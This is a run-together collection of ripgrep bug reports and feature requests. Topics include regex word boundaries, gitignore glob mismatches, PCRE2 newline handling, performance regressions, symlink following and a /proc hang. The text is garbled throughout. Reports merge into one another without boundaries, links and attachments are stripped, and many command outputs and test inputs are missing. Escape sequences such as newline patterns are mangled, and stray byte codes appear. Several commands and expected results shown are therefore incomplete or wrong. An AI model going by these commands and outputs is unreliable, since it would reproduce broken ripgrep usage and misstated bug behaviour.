$ echo 'i have 12, he has 2!' | rg -o '\\b..\\b'
``` #### if this is a bug, what is the expected behavior? i feel `ripgrep` should also behave as seen in other regex engines
$ # gnu grep 3.3
$ # grep -op '\\b..\\b' and rg -op '\\b..\\b' also produce same result
$ echo 'i have 12, he has 2!' | grep -o '\\b..\\b'
, he 2 $ echo \'i have 12, he has 2!\' | perl -lne \'print join "|", /\\b..\\b/g\'
i |12|, |he| 2
$ echo \'i have 12, he has 2!\' | ruby -ne \'puts $_.scan(/\\b..\\b/).join("|")\'
i |12|, |he| 2 $ # python3.7
>>> import re
>>> re.findall(r'\\b..\\b', 'i have 12, he has 2!')
['i ', '12', ', ', 'he', ' 2']
``` the below image might help in understanding what is happening in all these regex engines
vertical bar represents word boundary
note that even though `!` is at end of line, it doesn't have boundary after as it is not a word character
![ripgrep_word_boundary]( **note** * `grep -o '\\<..\\>'` (also in `vim`) will be different compared to `\\b` as `\\b` cannot differentiate between start and end word boundary
* `grep -ow '..'` is same as `rg -ow '..'` (perhaps because both do `(?<!\\w)pattern(?!\\w)` for `-w` option)
linux #hostname_elided# 4.4.0-141-generic #167-ubuntu smp wed dec 5 10:40:15 utc 2018 x86_64 x86_64 x86_64 gnu/linux this also appears to reproduce on ubuntu 12 as well
i found this problem while introducing ripgrep to a coworker and noticed how it was operating slowly (relative to what i'm used to) on his machine
then i downloaded it to mine and noticed the same performance difference
#### describe your question, feature request, or bug
i'm seeing a ~5x slowdown for identical searches on identical files (results repeatable)
#### if this is a bug, what are the steps to reproduce the behavior? i cannot include the corpus of my own work repository so i tried with the open office repo where i see a slowdown of 3-4x:
$ time /local/rulch/rg1100/ripgrep-11.0.0-x86_64-unknown-linux-musl/rg --debug okay > out-new 2>&1 real 0m0.808s
user 0m4.724s
sys 0m3.192s $ time /local/rulch/rg10/ripgrep-0.10.0-x86_64-unknown-linux-musl/rg --debug okay > out-old 2>&1 real 0m0.252s
user 0m1.304s
sys 0m1.328s open office repo: @ commit 633ece0517 please see the attachments for the new and old output with --debug provided.
[out-new.txt](
[out-old.txt]( in the open office repository it's not all that significant in terms of absolute time, but in my repository at work it causes searches to take a few seconds as opposed to half a second (at least for a small'ish number of results) on a 24 core machine
with less powerful cpus i can see this being pretty impactful
it's annoying but still faster than grep
is there some default behavior that changed from 0.10 to 11.0.0 that could explain this?
arch linux #### describe your question, feature request, or bug
attempting to use a newline character ("\ ") in pattern with the pcre2 engine (-p), outside multiline mode fails silently
#### if this is a bug, what are the steps to reproduce the behavior? create the following corpus.txt:
``` first, try the search with rust's engine:
rg "rip\ grep" corpus.txt
the literal \'"\ "\' is not allowed in a regex consider enabling multiline mode with the --multiline flag (or -u for short).
when multiline mode is enabled, new line characters can be matched.
as expected (from the documentation), we see an error
now try searching using the pcre2 engine:
rg -p "rip\ grep" corpus.txt
as we see, we've tried to use a newline char without multiline mode, but receive no error
the search fails silently
searching using the pcre2 engine, with multiline mode (-u) works as expected:
rg -pu "rip\ grep" corpus.txt
``` #### if this is a bug, what is the actual behavior? see output above #### if this is a bug, what is the expected behavior? i would expect ripgrep to throw an error, warning the user that newlines cannot be matched outside multiline mode (-u) when using pcre2
this would yield the same behaviour as when rust's engine is used (#1055)
arch linux #### describe your question, feature request, or bug
when reading patterns in from a file using the "-f" flag, it appears that the last character is lost
depending on the last character in the patterns file, this causes either a parsing error, or the silent use of a truncated pattern
#### if this is a bug, what are the steps to reproduce the behavior? create the patterns file (patterns.txt):
ensure a blank newline is not added at the end of the file by your editor (see bug #783) run the following command (you can use any file as the corpus, as we don't get as far as loading it):
rg -p -f patterns.txt testfile
``` #### if this is a bug, what is the actual behavior? ripgrep reports that there\'s a parsing error, indicating that the last char "]" has been lost whilst loading the patterns from the file:
pcre2: error compiling pattern at offset 22: missing terminating ] for character class
if you modify the patterns.txt file to the following, you no longer receive an error, even though the pattern is now invalid, leading me to believe that the last char is discarded: ```
``` #### if this is a bug, what is the expected behavior? read the last character of the file when loading patterns using "-f", omitting only a trailing newline, as per #783
#### describe your question, feature request, or bug
globset (and thus ripgrep) interpret braces (`{}`) as alternative ("a or b") whereas git doesn\'t, causing a different interpretation of entries containing braces in .gitignore
#### if this is a bug, what are the steps to reproduce the behavior? ```
git init foo && cd foo
touch 'test.txt' 'test.txt{}'
echo '*.txt{}' >.gitignore
rg --files --debug
``` #### if this is a bug, what is the actual behavior? ```
$ git status
on branch master no commits yet untracked files: (use "git add <file>..." to include in what will be committed) .gitignore foo.txt nothing added to commit but untracked files present (use "git add" to track) $ rg --files --debug
debug/grep::search//usr/share/cargo/registry/grep-0.1.9/src/search.rs:195: original regex hir pattern:
(?:[zz]{0})*
debug/grep::search//usr/share/cargo/registry/grep-0.1.9/src/search.rs:197: transformed regex hir pattern:
(?:[zz]{0})*
debug/globset//usr/share/cargo/registry/globset-0.4.1/src/lib.rs:429: built glob set; 0 literals, 1 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug/globset//usr/share/cargo/registry/globset-0.4.1/src/lib.rs:424: glob converted to regex: glob { glob: "**/*.txt{}", re: "(?-u)^(?:/?|.*/).*\\\\.txt$", opts: globoptions { case_insensitive: false, literal_separator: false, backslash_escape: true }, tokens: tokens([recursiveprefix, zeroormore, literal(\'.\'), literal(\'t\'), literal(\'x\'), literal(\'t\'), alternates([tokens([])])]) }
debug/globset//usr/share/cargo/registry/globset-0.4.1/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 1 regexes
debug/ignore::walk//usr/share/cargo/registry/ignore-0.4.3/src/walk.rs:1414: ignoring ./foo.txt: ignore(ignorematch(gitignore(glob { from: some("./.gitignore"), original: "*.txt{}", actual: "**/*.txt{}", is_whitelist: false, is_only_dir: false })))
debug/ignore::walk//usr/share/cargo/registry/ignore-0.4.3/src/walk.rs:1414: ignoring ./.git: ignore(ignorematch(override(glob(matched(glob { from: none, original: "!.git", actual: "**/.git", is_whitelist: true, is_only_dir: false })))))
``` #### if this is a bug, what is the expected behavior? `rg --files` should list `foo.txt` and ignore `foo.txt{}` (matching git's behavior), not the opposite.
centos linux 7.6.1810 #### if this is a bug, what are the steps to reproduce the behavior? this will reproduce the issue on my machine: ```
$ echo foo > foo.bc.js
$ rg -g '!*.bc.js' --no-ignore foo
$ rg -g '!*.bc.js' -g '!*.build_info.c' --no-ignore foo
$ rg -g '!*.build_info.c' -g '!*.bc.js' --no-ignore foo
$ rg -g '!*.bald_info.c' -g '!*.bc.js' --no-ignore foo
``` this was originally discovered with `.ignore` files, but it looks like it extends to `-g` flags as well
what is happening here is: i would expect the `foo.bc.js` file we created to be ignored like it is in most of these invocations
however specifically the third one where we specify `!*.build_info.c` first, it is *not* ignored
it seems like certain strings will trigger this, and some will not, as the fourth invocation demonstrates
here's the debug output from the failing command: ```
$ rg -g '!*.build_info.c' -g '!*.bc.js' --no-ignore foo --debug
debug|grep_regex::literal|grep-regex/src/literal.rs:58: literal prefixes detected: literals { lits: [complete(foo), complete(foo), complete(foo), complete(foo), complete(foo), complete(foo), complete(foo), complete(foo)], limit_size: 250, limit_class: 10 }
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 0 extensions, 0 prefixes, 2 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
#### describe your question, feature request, or bug
the `**/**/*` pattern does not match `a/foo.rs` while git does
similarly for `**/**/**/*` and so on
#### if this is a bug, what are the steps to reproduce the behavior? ```
$ mkdir /tmp/rgbug
$ cd /tmp/rgbug
$ echo '**/**/*' > .gitignore
$ echo test > a/foo
``` #### if this is a bug, what is the actual behavior? `foo` is shown as a search result, but it should be ignored
the output of `--debug` shows this line: ```
debug|globset|globset/src/lib.rs:424: glob converted to regex: glob { glob: "**/**/*", re: "(?-u)^(?:/|/.*/)[^/]*$", opts: globoptions { case_insensitive: false, literal_separator: true, backslash_escape: true }, tokens: tokens([recursivezeroormore, zeroormore]) }
``` the glob-to-regex conversion here appears wrong, since `(?-u)^(?:/|/.*/)[^/]*$` can only ever match paths that start with a `/`
#### if this is a bug, what is the expected behavior? `foo` should have been ignored by the `**/**/*` pattern.
#### describe your question, feature request, or bug
the `**` pattern does not work in a `.gitignore` file
#### if this is a bug, what are the steps to reproduce the behavior? ```
$ mkdir /tmp/rgbug
$ cd /tmp/rgbug
$ echo '**' > .gitignore
$ echo test > foo
``` #### if this is a bug, what is the actual behavior? `foo` is shown as a search result, but it should be ignored
#### if this is a bug, what is the expected behavior? `foo` should have been ignored by the `**` pattern.
windows 10 #### describe your question, feature request, or bug
i'm trying to get a list of files that contain one word, but not another word
to do that i call "rg -l foo" to get a list of files that i pass on to another call with "rg --files-without-match bar"
the call looks something like this: rg -l foo | xargs -i -d '\ ' rg --files-without-match bar {} this doesn't work because --files-without-match cannot be used with a single file
the error message is " output kind pathwithoutmatch requires a file path"
however i don't understand why that shouldn't be possible.
maybe there's a better way to do this? if not i'd really appreciate it if that could be implemented.
windows 10 1803 #### problem description given the following input file `test.txt`:
``` compare the following commands with their outputs:
> rg -e "(\\d+) x (.)" test.txt
> rg -e "(\\d+) x (.*)" --replace \'$1 y $2\' test.txt
> rg -e "(\\d+) x (.)" --replace \'$2 y $1\' test.txt
> rg -e "(\\d+) x (.*)" --replace \'$2 y $1\' test.txt y 1 y 2
``` everything except (4) is as expected, but in (4) suddenly the capture groups seem to behave differently compared to (2) although the only difference is that they are used in a different order in `--replace` ..
is this a bug? it also seems to be related to the `*` in the regex, because in (3) it works as expected.
arch linux (rolling)
#### describe your question, feature request, or bug
the following section of the man page (`man rg`) contains..
incomplete(?) sentences (emphasis mine): > -u, --multiline
enable matching across multiple lines
> when multiline mode is enabled, ripgrep will lift the restriction that a match
cannot include a line terminator
for example, **when multiline mode is not codepoint
other than \ **
similarly, the regex \ is explicitly forbidden, and if you try to
use it, ripgrep will return an error
however, **when multiline and regexes like \ **
are permitted.
ubuntu 18.04.1 ```
jack@happy:~/downloads/ruby-2.5.1$ uname -a
linux happy 4.15.0-33-generic #36-ubuntu smp wed aug 15 16:00:05 utc 2018 x86_64 x86_64 x86_64 gnu/linux
``` #### if this is a bug, what are the steps to reproduce the behavior? download ruby source code and search in it's directory
jack@happy:/tmp$ curl --silent > ruby-2.5.1.tar.gz
jack@happy:/tmp$ tar xf ruby-2.5.1.tar.gz jack@happy:/tmp$ cd ruby-2.5.1/
jack@happy:/tmp/ruby-2.5.1$ rg foobarbazquz
thread '<unnamed>' panicked at 'index out of bounds: the len is 1 but the index is 1', /home/jack/.cargo/registry/src/github.com-1ecc6299db9ec823/encoding_rs-0.8.6/src/handles.rs:309:21
note: run with `rust_backtrace=1` for a backtrace.
``` process then is hung
#### if this is a bug, what is the actual behavior? command: `rg --debug foobarbazquz` output: #### if this is a bug, what is the expected behavior? not panic.
ubuntu 16.04 #### describe your question, feature request, or bug
thanks for the fix to #842 to which this is somewhat related
commit 5c80e4a does not add completion files for bash, zsh etc
to the deb package
i understand this was committed after the 0.9.0 release, but as it stands the next release will still lack these completion files, despite this [faq entry]( #complete) suggesting otherwise
is there a plan to add them to the deb build or should we settle for downloading the release tar & manually copying them to the appropriate location?
x86_64 gnu/linux ubuntu 18.04 #### describe your question, feature request, or bug
when using options like `-a` or `-b`, rg may exit silently when matching some patterns
#### if this is a bug, what are the steps to reproduce the behavior?
[hang-res.zip]( ![2018-08-28-205721_562x498_scrot]( #### if this is a bug, what is the actual behavior?
`-a` version should print matched lines and lines after
debian testing
#### describe your question, feature request, or bug
global gitignore file is not picked up if `~/.gitconfig` doesn't include the reference to ignoresfile directly, but via
[include] path = /path/to/sub-git-config
and only `/path/to/sub-git-config` includes
[core] excludesfile = /home/user/.gitignore
``` #### if this is a bug, what are the steps to reproduce the behavior?
move all your ~/.gitconfig content to ~/.gitconfig_include
replace ~/.gitconfig contents with
[include] path = ~/.gitconfig_include
search for content/file that includes files matched by your ~/.gitignore
rg returns the file you expected to be ignored #### if this is a bug, what is the actual behavior? as can be seen running with `--debug` flag on, global gitignore file is not picked up.
ssokolow@monolith ignore_test [master] % lsb_release -a no lsb modules are available
distributor id: ubuntu description: ubuntu 14.04.5 lts release: 14.04 codename: trusty #### describe your question, feature request, or bug
iterators from the `ignore` crate incorrectly identify the argument passed to them as a symlink when they return it during the first iteration
this is actually quite the annoyance for a project i've just started, because it means i'm going to need to design some kind of minimally ugly hack to do a second syscall to get the *actual* value but only on the first iteration to avoid needlessly bogging down the following iterations
#### if this is a bug, what are the steps to reproduce the behavior? use std::fs::metadata; extern crate ignore; use ignore::walk; fn main() { for result in walk::new("./") { if let ok(entry) = result { let verification = metadata(entry.path()).unwrap().file_type().is_symlink(); println!("{}: {}", entry.path_is_symlink() == verification, entry.path().display()); } } } #### if this is a bug, what is the actual behavior? ssokolow@monolith ignore_test [master] % cargo run compiling ignore_test v0.1.0 ( finished dev [unoptimized + debuginfo] target(s) in 4.72 secs running `target/debug/ignore_test` false: ./ true: ./cargo.lock true: ./src true: ./src/main.rs true: ./target true: ./target/debug [output truncated for brevity as the rest is irrelevant] (note that the first entry is `false`, indicating that the result returned by `ignore`\'s `path_is_symlink` doesn\'t match the result returned by explicitly querying the filesystem.) #### if this is a bug, what is the expected behavior? ssokolow@monolith ignore_test [master] % cargo run compiling ignore_test v0.1.0 ( finished dev [unoptimized + debuginfo] target(s) in 4.72 secs running `target/debug/ignore_test` true: ./ true: ./cargo.lock true: ./src true: ./src/main.rs true: ./target true: ./target/debug [output truncated for brevity as the rest is irrelevant] (note that the first entry is `true` as well)
`linux 3.13.0-43-generic #72-ubuntu smp mon dec 8 19:35:06 utc 2014 x86_64 x86_64 x86_64 gnu/linux`
`linux 4.14.34-v7+ #1110 smp mon apr 16 15:18:51 bst 2018 armv7l gnu/linux`
`darwin 17.7.0 darwin kernel version 17.7.0: thu jun 21 22:53:14 pdt 2018; root:xnu-4570.71.2~1/release_x86_64 x86_64` #### describe your question, feature request, or bug
~$ yes | rg -n ^$ | head 2:
``` #### if this is a bug, what is the expected behavior? `yes | rg ^$` should not find any matches
this also seems to break line numbers on any pattern that could possibly match a blank line
(i was searching for `^.{0,12}$` in a file that contains no empty lines and was surprised to find empty lines
my workaround was to change the pattern to `^{1,12}$`, but i was looking at incorrect line numbers until then.) ```
~$ yes | rg -c1 -n ^$ | head 1-y
``` this looks similar to #441, but that's only at the end of file.
macos 10.13.5 (17f77) #### describe your question, feature request, or bug
performance of ripgrep seems to be substantially slower than gnu grep on a log file i am parsing
logs are of the format (sanitized):
server.name.xz:jun 06 00:02:35.172 server.name [e] 2018/06/05 23:02:35.141 e 1c0e236fbb0cca535b176a83339eb 5254 13032 **************************************** 164ms response: java::javanet::connectexception connection refused connection refused
hgoscenski@hgoscenski-ltm:~/downloads
ls -halt noc_9512v2.txt -rw-r--r--@ 1 hgoscenski staff 56m jun 11 10:57 noc_9512v2.txt
``` #### terminal output with rg, grep, ggrep
macos 10.13.4 #### describe your question, feature request, or bug
the command
rg --passthrough searchterm file.txt
should exit with the same code as when the command is run without the flag
both `ack` and `ag` work this way
#### if this is a bug, what are the steps to reproduce the behavior? ```
$ echo hi > file
$ rg asdf file
$ rg --passthrough asdf file
``` #### if this is a bug, what is the actual behavior? `ripgrep --passthrough` always exits with `0` (unless the file is empty)
$ rg --passthrough --debug asdf file
debug/grep::search/grep/src/search.rs:195: regex ast:
alternate( [ literal { chars: [ 'a', 's', 'd', 'f' ], casei: false }, starttext ]
debug/globset/globset/src/lib.rs:401: built glob set; 0 literals, 0 basenames, 0 extensions, 0 prefixes, 0 suffixes, 1 required extensions, 0 regexes
``` #### if this is a bug, what is the expected behavior? to exit with the same status as without the flag.
mac 10.13.4 #### describe your question, feature request, or bug
create a `.gitignore` in your `$home` directory
cd over to `/tmp`, mkdir a pattern excluded in `.gitignore` and execute `rg`
#### if this is a bug, what are the steps to reproduce the behavior? ```
echo "*.apk" > ~/.gitignore
touch foo.apk
rg --debug --files
debug/grep::search/grep/src/search.rs:195: regex ast:
repeat { e: literal { chars: [ 'z' ], casei: false }, r: range { min: 0, max: some( 0 ) }, greedy: true
debug/globset/globset/src/lib.rs:401: built glob set; 0 literals, 0 basenames, 1 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug/ignore::walk/ignore/src/walk.rs:1428: ignoring ./.keystone_install_lock: ignore(ignorematch(hidden))
debug/ignore::walk/ignore/src/walk.rs:1428: ignoring ./foo.apk: ignore(ignorematch(gitignore(glob { from: some("/users/junger/.gitignore"), original: "*.apk", actual: "**/*.apk", is_whitelist: false, is_only_dir: false })))
``` #### if this is a bug, what is the actual behavior? see above
#### if this is a bug, what is the expected behavior?
ripgrep should not use .gitignore in your $home directory when searching in other directories such as `/tmp`
$ macosver productbuildversion 17c2120
productcopyright 1983-2017 apple inc.
productname mac os x
productuservisibleversion 10.13.2
productversion 10.13.2
``` #### if this is a bug, what are the steps to reproduce the behavior? ```
$ echo test > test
$ zip test.zip test adding: test (stored 0%)
$ tar zcvf test.tar.gz test
$ gzip test
$ rg -z test
1:test $ rg -zl test
> uname -s -r -v -m -p -i -o
linux 4.16.7-1-arch #1 smp preempt wed may 2 21:12:36 utc 2018 x86_64 unknown unknown gnu/linux
``` #### describe the bug
even if it does not seem like a good idea in general to search the whole file system without excluding special folders like `/proc` (see also #311: *"tl;dr is: don\'t search /proc"*), i think that users will attempt to do so
we recently tracked down one specific reproducible state which causes the `ignore` crate to hang while traversing `/proc` (see for more details)
the same bug can be reproduced with `rg --files`
#### if this is a bug, what are the steps to reproduce the behavior? 1
make sure that there are no zombie processes on your system (`ps -ef | rg '<defunct>'`) 2
run `rg --files > /dev/null 2>&1` inside `/proc`
everything should work fine (process exits after a few seconds)
create a zombie process on purpose a
copy the code from into a file called `zombie.c` b
compile it `gcc -o zombie zombie.c` c
run it: `./zombie` 4
run `rg --files > /dev/null 2>&1` inside `/proc` again
this seems to hang indefinitely
get the pid of the zombie process via `ps -ef | rg '<defunct>'`
call it `$pid`
run `rg --glob "\\!$pid" --files > /dev/null 2>&1`
this should work fine, indicating that the directory traversal hangs in `/proc/$pid`
#### if this is a bug, what is the actual behavior? `rg --files` hangs indefinitely inside the `/proc` folder
#### if this is a bug, what is the expected behavior? `rg --files` traverses the `/proc` folder in finite time
note: `find`, for example, does not seem to have this problem and finishes in finite time even in the presence of zombie processes.
alpinelinux #### describe your question, feature request, or bug
```
---- compressed_failing_gzip stdout ---- thread 'compressed_failing_gzip' panicked at 'assertion failed: `(left == right)` left: `false`, right: `true`', tests/tests.rs:1769:5
note: some details are omitted, run with `rust_backtrace=full` for a verbose backtrace.
stack backtrace: 0: std::sys::unix::backtrace::tracing::imp::unwind_backtrace at src/libstd/sys/unix/backtrace/tracing/gcc_s.rs:49 1: std::sys_common::backtrace::print at src/libstd/sys_common/backtrace.rs:68 at src/libstd/sys_common/backtrace.rs:57 2: std::panicking::default_hook::{{closure}} at src/libstd/panicking.rs:381 3: std::panicking::default_hook at src/libstd/panicking.rs:391 4: std::panicking::rust_panic_with_hook at src/libstd/panicking.rs:577 5: std::panicking::begin_panic at src/libstd/panicking.rs:538 6: std::panicking::begin_panic_fmt at src/libstd/panicking.rs:522 7: integration::compressed_failing_gzip at tests/tests.rs:1769 8: <f as alloc::boxed::fnbox<a>>::call_box at src/libtest/lib.rs:1449 at /home/buildozer/aports/community/rust/src/rustc-1.24.1-src/src/libcore/ops/function.rs:223 at /home/buildozer/aports/community/rust/src/rustc-1.24.1-src/src/liballoc/boxed.rs:815 9: __rust_maybe_catch_panic at src/libpanic_unwind/lib.rs:101 failures: compressed_failing_gzip test result: failed
155 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out ``` #### if this is a bug, what are the steps to reproduce the behavior?
try to build ripgrep by abuild of alpinelinux.
macos high sierra #### bug this works: ```
</etc/hosts
# host database
``` ---- this doesn't: `$ rg
< /dev/urandom` or more practical example: `$ rg -uuu -o abc < /dev/urandom` it seems it fallback into searching the current folder
however this syntax work: ```
$ cat /dev/urandom | rg -uuu -o abc
``` ---- i believe it should work similar as other tools, e.g
$ strings </dev/urandom | head
</dev/urandom # gnu grep
binary file (standard input) matches
macos high sierra #### bug this command detects multiple `-v` params: ```
$ rg -ve foo -ve bar /dev/null
error: the argument '--invert-match' was provided more than once, but cannot be used multiple times
``` this doesn't: ```
$ rg -ve foo -v -e bar /dev/null
``` also this one: ```
$ rg -v -e foo --invert-match --invert-match -e bar /dev/null
``` i'm not sure what should be the expected behaviour, but i think it's not consistent.
`macos 13.13.3` #### describe your question, feature request, or bug
i have 4mb big whatsapp chat history, mostly text but lots of emojis.
doing some manual stats, i wanted to count number of chats, etc.
the data spans 3 years, 2016-2018
lines look like this: ```
23/09/2016, 21:29 - sender: text
``` nothing special, really
trying to count all chats: ```
$ rg -c " 201., " chat.txt
$ grep -c "201., " chat.txt
``` searching for any other pattern stops at the same line in the file
(checked with actual output instead of `-c`): ```
$ rg -c " - sender1: " chat.txt
$ grep -c " - sender1: " chat.txt
``` for the personal nature of the corpus i am not able to include it...
but none of the surrounding lines where `rg` stops even have emojis..
$ rg --debug -c "201., " chat.txt
debug/grep::search/grep/src/search.rs:195: regex ast:
concat( [ literal { chars: [ '2', '0', '1' ], casei: false }, anycharnonl, literal { chars: [ ',', ' ' ], casei: false } ]
debug/grep::literals/grep/src/literals.rs:88: required literal found: "201"
``` #### if this is a bug, what are the steps to reproduce the behavior? see above #### if this is a bug, what is the actual behavior? see above #### if this is a bug, what is the expected behavior? see above the grep counts
linux #### describe your question, feature request, or bug
it is possible for ripgrep to fail to open a memory map with the `enomem` error
in particular, i believe this can happen if one tries to search a file that is bigger than available memory
i had thought this case would be ok since the os could handle swapping the file into and out of memory, but i now wonder whether this is caused by overcommit settings? no matter the cause, if the mmap fails with enomem, then we should probably just fall back to standard read/write calls
(one wonders whether we should do this regardless of how mmap fails.) this bug was found as part of the investigation in #850.
debian stretch 64 bit #### describe your question, feature request, or bug
ripgrep is at least 4 times slower than grep on a certain use case (never waited long enough for it to return)
see data with test files attached.
[ripgrep_data_test.tar.gz]( attached file is around 15 mb uncompressed, may be possible to reduce the sample further but the original files i was dealing with were 100x
see readme.md and test.sh , i tried with and without --dfa-size-limit another minor issue i noticed is that a hint to use --fixed-strings us provided to the user even when using -f already, perhaps this only happens when regex-size-limit is not passed in
ideally ripgrep would be faster than grep :-) #### if this is a bug, what are the steps to reproduce the behavior? assumes rg is in the directory or already in the path, then run test.sh
archlinux (4.15.3-2-arch), also ubuntu 16.04 #### describe your question, feature request, or bug
if i am in a git repository and run `rg` with a directory as a path argument, then all files under that directory are searched, even if they would normally be ignored because of .gitignore rule
if i `cd` into the directory and run `rg` without a path argument, the files are excluded as i expect
changing into a subdirectory is a workaround but is sometimes less convenient than using a path argument
the man page does say > paths specified expicitly on the command line override glob and ignore rules
which could be interpreted to mean that the if such an argument is specified, the ignore rules are ignored altogether
but that behaviour is unexpected to me, and the wording of the documentation isn't entirely clear on whether it overrides _all_ rules, or only rules that specifically ignore the specified path (but not children of that path)
if overriding all ignore rules is the intended behaviour there should at least be a way to turn the ignore rules back on, but `--ignore-vcs` does nothing when supplied with a path argument
interestingly, if i specify a glob such as `-g "*.c"`, that is respected for files under the path
#### steps to reproduce: .gitignore:
``` a/b/test.txt:
sample text
``` in root of repository: `rg sample` produces no output ```
$ rg sample a
a/b/test.txt
1:sample text
``` adding `--ignore-vcs` produces the same output
in `a` directory `rg sample` also produces no output
#### if this is a bug, what is the actual behavior? `rg --debug sample a` ```
debug/grep::search/grep/src/search.rs:195: regex ast:
literal { chars: [ 's', 'a', 'm', 'p', 'l', 'e' ], casei: false
debug/grep::literals/grep/src/literals.rs:38: literal prefixes detected: literals { lits: [complete(sample)], limit_size: 250, limit_class: 10 }
debug/globset/globset/src/lib.rs:396: glob converted to regex: glob { glob: "**/.*~", re: "(?-u)^(?:/?|.*/)\\\\..*\\\\~$", opts: globoptions { case_insensitive: false, literal_separator: false }, tokens: tokens([recursiveprefix, literal(\'.\'), zeroormore, literal(\'~\')]) }
debug/globset/globset/src/lib.rs:401: built glob set; 0 literals, 0 basenames, 1 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 1 regexes
debug/globset/globset/src/lib.rs:401: built glob set; 1 literals, 0 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
a/b/test.txt
1:sample text
``` #### if this is a bug, what is the expected behavior? produced no output, since a/b/test.txt is ignored by the .gitignore file.
windows 10 64bit #### if this is a bug, what are the steps to reproduce the behavior? 0.8.0 always follows symlinks, also without `--follow`:
- create two sibling folders `cwd` and `linktarget`
- create one file in each folder `cwd\\\\one.txt` and `linktarget\\\\two.txt`
- create a link in the `cwd` folder targeting the `linktarget` folder: - `mklink /d link ..\\\\linktarget`
- run ripgrep in `cwd`: `rg --files` also reproduces without `--files`
#### if this is a bug, what is the actual behavior? ```
debug/grep::search/grep\\src\\search.rs:195: regex ast:
repeat { e: literal { chars: [ 'z' ], casei: false }, r: range { min: 0, max: some( 0 ) }, greedy: true
link\\two.txt
``` #### if this is a bug, what is the expected behavior? ```
``` /cc @roblourens
windows 10 #### if this is a bug, what are the steps to reproduce the behavior? using an old commit of the chromium sources (`git clone `) as corpus (~230k files)
with 0.8.0 `--files` runs about 4x longer:
ps c:\\devel\\testworkspace> (measure-command { & 'c:\\devel\ ipgrep-0.8.0-x86_64-pc-windows-msvc\ g.exe' --files | measure-object \xa8cline | out-default }).totalseconds lines words characters property ----- ----- ---------- --------
234319 [files] 43.309153 [seconds]
``` than with 0.7.1:
ps c:\\devel\\testworkspace> (measure-command { & 'c:\\devel\ ipgrep-0.7.1-x86_64-pc-windows-msvc\ g.exe' --files | measure-object \xa8cline | out-default }).totalseconds lines words characters property ----- ----- ---------- --------
234319 [files] 11.2432563 [seconds]
``` using process monitor it looks like 0.8.0 accesses individual files a lot more:
![image]( than 0.7.1, which seems to only access folders:
![image]( /cc @roblourens
xubuntu 17.10 #### describe your question, feature request, or bug
the behaviour of --hidden when using fully specified ignore-paths is
confusing, possibly a bug since it's inconsistent with
partially-specified ignore-paths (or i'm not sure what the intended
behaviour is)
in short, it seems that ignored subdirectories of hidden directories
are shown if they are specified in `.gitignore` prefixed with the
hidden directory *and* a path argument is given to rg
#### if this is a bug, what are the steps to reproduce the behavior? download and unzip
[repro.zip](
where `.gitignore` contains /.hidden/ignored relativelyignored and the reproduction script `repro.sh` contains rg -l -- '[k]ake' # as expected rg -l -- '[k]ake'
# as expected rg -l --hidden -- '[k]ake' # as expected rg -l --hidden -- '[k]ake'
# wat where the last command has the unexpected output
#### if this is a bug, what is the actual behavior? $ rg --debug -l --hidden -- '[k]ake'
debug/grep::search/grep/src/search.rs:195: regex ast: concat( [ class( charclass { ranges: [ classrange { start: \'k\', end: \'k\' } ] } ), literal { chars: [ \'a\', \'k\', \'e\' ], casei: false } ] ) debug/grep::literals/grep/src/literals.rs:38: literal prefixes detected: literals { lits: [complete(kake)], limit_size: 250, limit_class: 10 } debug/globset/globset/src/lib.rs:401: built glob set; 1 literals, 1 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes file .hiddenfile debug/ignore::walk/ignore/src/walk.rs:1392: ignoring ./.hidden/relativelyignored: ignore(ignorematch(gitignore(glob { from: some("./.gitignore"), original: "relativelyignored", actual: "**/relativelyignored", is_whitelist: false, is_only_dir: false }))) shown/file .hidden/file .hidden/ignored/file #### if this is a bug, what is the expected behavior? i would\'ve expected ignored directories to have stayed ignored even
though they're inside hidden directories even if i specified --hidden
(i rarely if ever want to make any distinction between hidden and
non-hidden directories as regards `rg`, i use `.gitignore` or
`.ignore` for when i want `rg` to not show things)
note that, confusingly, the file inside `relativelyignored` inside
`.hidden` is *not* shown even when using both `--hidden` and a path.
